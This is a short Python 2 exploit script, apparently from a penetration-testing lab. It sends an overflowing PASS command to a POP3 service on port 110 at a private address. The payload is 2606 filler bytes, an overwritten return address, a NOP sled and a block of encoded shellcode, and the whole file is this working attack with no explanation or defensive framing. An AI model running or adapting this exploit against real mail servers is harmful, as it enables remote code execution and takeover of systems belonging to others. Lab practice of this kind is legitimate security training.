#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = ("\xd9\xf7\xbf\x4a\xbc\x12\x27\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x52\x31\x78\x17\x83\xc0\x04\x03\x32\xaf\xf0\xd2\x3e\x27\x76"
"\x1c\xbe\xb8\x17\x94\x5b\x89\x17\xc2\x28\xba\xa7\x80\x7c\x37"
"\x43\xc4\x94\xcc\x21\xc1\x9b\x65\x8f\x37\x92\x76\xbc\x04\xb5"
"\xf4\xbf\x58\x15\xc4\x0f\xad\x54\x01\x6d\x5c\x04\xda\xf9\xf3"
"\xb8\x6f\xb7\xcf\x33\x23\x59\x48\xa0\xf4\x58\x79\x77\x8e\x02"
"\x59\x76\x43\x3f\xd0\x60\x80\x7a\xaa\x1b\x72\xf0\x2d\xcd\x4a"
"\xf9\x82\x30\x63\x08\xda\x75\x44\xf3\xa9\x8f\xb6\x8e\xa9\x54"
"\xc4\x54\x3f\x4e\x6e\x1e\xe7\xaa\x8e\xf3\x7e\x39\x9c\xb8\xf5"
"\x65\x81\x3f\xd9\x1e\xbd\xb4\xdc\xf0\x37\x8e\xfa\xd4\x1c\x54"
"\x62\x4d\xf9\x3b\x9b\x8d\xa2\xe4\x39\xc6\x4f\xf0\x33\x85\x07"
"\x35\x7e\x35\xd8\x51\x09\x46\xea\xfe\xa1\xc0\x46\x76\x6c\x17"
"\xa8\xad\xc8\x87\x57\x4e\x29\x8e\x93\x1a\x79\xb8\x32\x23\x12"
"\x38\xba\xf6\xb5\x68\x14\xa9\x75\xd8\xd4\x19\x1e\x32\xdb\x46"
"\x3e\x3d\x31\xef\xd5\xc4\xd2\x1a\x21\xc6\x63\x73\x37\xc6\x62"
"\x38\xbe\x20\x0e\x2e\x97\xfb\xa7\xd7\xb2\x77\x59\x17\x69\xf2"
"\x59\x93\x9e\x03\x17\x54\xea\x17\xc0\x94\xa1\x45\x47\xaa\x1f"
"\xe1\x0b\x39\xc4\xf1\x42\x22\x53\xa6\x03\x94\xaa\x22\xbe\x8f"
"\x04\x50\x43\x49\x6e\xd0\x98\xaa\x71\xd9\x6d\x96\x55\xc9\xab"
"\x17\xd2\xbd\x63\x4e\x8c\x6b\xc2\x38\x7e\xc5\x9c\x97\x28\x81"
"\x59\xd4\xea\xd7\x65\x31\x9d\x37\xd7\xec\xd8\x48\xd8\x78\xed"
"\x31\x04\x19\x12\xe8\x8c\x29\x59\xb0\xa5\xa1\x04\x21\xf4\xaf"
"\xb6\x9c\x3b\xd6\x34\x14\xc4\x2d\x24\x5d\xc1\x6a\xe2\x8e\xbb"
"\xe3\x87\xb0\x68\x03\x82")

#buffer = 'A' * 2606 + 'B' * 4 + 'C'*(3500 -2606-4)
buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode


try:
	print "\nSending evil Buffer"
	s.connect(('10.11.16.67',110))
	data = s.recv(1024)
	s.send('USER username' + '\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print '\ndone'
except:
	print "Could not connect to pop3"
